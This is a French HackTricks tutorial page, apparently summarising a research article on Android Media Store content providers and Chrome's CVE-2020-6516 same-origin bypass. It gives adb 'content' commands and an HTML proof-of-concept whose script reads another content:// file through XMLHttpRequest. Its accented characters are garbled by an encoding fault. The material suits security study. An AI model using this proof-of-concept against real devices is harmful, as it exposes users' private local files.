<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>


**Il s'agit d'un r√©sum√© de l'article [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Listing des fichiers dans le Media Store
Pour lister les fichiers g√©r√©s par le Media Store, la commande ci-dessous peut √™tre utilis√©e :
```bash
$ content query --uri content://media/external/file
```
Pour une sortie plus conviviale, affichez uniquement l'identifiant et le chemin de chaque fichier index√© :
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Les fournisseurs de contenu sont isol√©s dans leur propre espace de noms priv√©. L'acc√®s √† un fournisseur n√©cessite l'URI sp√©cifique `content://`. Les informations sur les chemins d'acc√®s √† un fournisseur peuvent √™tre obtenues √† partir des manifestes d'application ou du code source du framework Android.

### Acc√®s de Chrome aux fournisseurs de contenu
Chrome sur Android peut acc√©der aux fournisseurs de contenu via le sch√©ma `content://`, lui permettant d'acc√©der √† des ressources telles que des photos ou des documents export√©s par des applications tierces. Pour illustrer cela, un fichier peut √™tre ins√©r√© dans le Media Store, puis acc√©d√© via Chrome :

Ins√©rer une entr√©e personnalis√©e dans le Media Store :
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
D√©couvrez l'identifiant du fichier nouvellement ins√©r√© :
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Le fichier peut ensuite √™tre consult√© dans Chrome en utilisant une URL construite avec l'identifiant du fichier.

Par exemple, pour r√©pertorier les fichiers li√©s √† une application sp√©cifique :
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Contournement de la politique de m√™me origine

La _Politique de M√™me Origine_ (SOP) est un protocole de s√©curit√© dans les navigateurs qui restreint les pages web √† interagir avec des ressources provenant de diff√©rentes origines, sauf si explicitement autoris√© par une politique de partage de ressources entre origines (CORS). Cette politique vise √† pr√©venir les fuites d'informations et les attaques de falsification de requ√™tes inter-sites. Chrome consid√®re `content://` comme un sch√©ma local, impliquant des r√®gles SOP plus strictes, o√π chaque URL de sch√©ma local est trait√©e comme une origine distincte.

Cependant, CVE-2020-6516 √©tait une vuln√©rabilit√© dans Chrome qui permettait de contourner les r√®gles SOP pour les ressources charg√©es via une URL `content://`. En pratique, le code JavaScript d'une URL `content://` pouvait acc√©der √† d'autres ressources charg√©es via des URL `content://`, ce qui constituait une pr√©occupation majeure en termes de s√©curit√©, notamment sur les appareils Android ex√©cutant des versions ant√©rieures √† Android 10, o√π le stockage cibl√© n'√©tait pas impl√©ment√©.

Le concept de preuve ci-dessous d√©montre cette vuln√©rabilit√©, o√π un document HTML, apr√®s avoir √©t√© t√©l√©charg√© sous **/sdcard** et ajout√© au Media Store, utilise `XMLHttpRequest` dans son JavaScript pour acc√©der et afficher le contenu d'un autre fichier dans le Media Store, contournant les r√®gles SOP.

Concept de preuve HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
